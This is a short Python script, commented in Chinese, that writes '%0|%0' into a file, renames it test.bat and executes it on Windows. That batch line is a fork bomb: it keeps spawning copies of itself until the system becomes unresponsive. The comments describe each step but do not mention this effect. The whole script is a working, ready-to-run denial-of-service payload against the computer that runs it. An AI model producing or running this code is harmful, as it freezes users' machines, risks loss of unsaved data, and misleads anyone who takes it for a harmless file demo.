'''
这个文件只能用于Windows系统，因为Linux或macOS不能运行.bat的批处理文件
'''

import os    #导入os库

with open('test.txt','w',encoding='utf-8') as f :    #创建文件"test.txt"
    f.write('%0|%0')    #往里面写入"%0|%0"

os.rename('test.txt','test.bat')    #将文件重命名为"test.bat"
os.system('test.bat')    #运行这个批处理文件
